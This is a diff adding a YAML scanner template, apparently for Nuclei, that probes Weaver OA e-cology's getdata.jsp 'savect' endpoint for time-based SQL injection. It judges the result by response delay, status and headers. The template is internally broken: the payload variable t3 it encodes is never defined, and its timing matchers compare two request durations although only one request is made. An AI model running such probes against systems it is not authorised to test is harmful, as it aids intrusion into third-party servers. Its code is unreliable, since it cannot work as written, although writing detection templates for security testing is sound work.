@@ -1,0 +1,30 @@
+id: poc-yaml-weaver-e-cology-savect-sqli
+info:
+  name: "泛微OA e-cology savect 接口SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 泛微OA,e-cology
+
+variables:
+  t4: "{{url_encode(url_encode(t3))}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/js/hrm/getdata.jsp?cmd=savect&arg0={{t4}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ecology"
+      - type: dsl
+        dsl:
+          - "trim(body) == ''"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
